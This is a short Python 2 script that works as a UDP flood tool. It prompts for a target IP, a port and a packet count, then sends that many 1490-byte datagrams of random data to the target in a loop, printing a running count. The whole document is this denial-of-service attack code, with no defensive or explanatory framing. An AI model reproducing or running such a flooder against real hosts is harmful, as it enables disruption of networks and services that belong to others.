import os
import time
import random
import socket
sent = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = raw_input("~ IP: ")
port = input("~ Port: ")
packetsToSend = int(input('~ Packets: '))
while sent < packetsToSend:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port
     print "Sent %s packets to ip: %s in port:%s"%(sent,ip,port)
     os.system('clear')
